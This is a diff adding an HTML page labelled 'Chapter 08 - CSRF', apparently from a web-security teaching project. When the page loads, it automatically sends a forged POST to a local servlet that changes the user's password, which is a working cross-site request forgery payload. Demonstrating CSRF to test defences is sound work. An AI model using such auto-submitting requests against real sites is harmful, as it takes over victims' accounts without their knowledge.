@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chapter 08 - CSRF</title>
+    <link rel="stylesheet" type="text/css" href="resources/css/styles.css" />
+
+    <script type="text/javascript">
+        function sendForm() {
+            const params = "newPassword=XMLHttpRequest&confirmPassword=XMLHttpRequest";
+            const request = new XMLHttpRequest();
+
+            request.open("POST", "http://localhost:8080/Ch08_CSRF/ProtectedServlet", true);
+            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            request.send(params);
+        }
+    </script>
+</head>
+<body onload="sendForm()">
+    <h1>Chapter 08 - CSRF</h1>
+
+    <p><a href="requests-protected.html">Back</a></p>
+</body>
+</html>
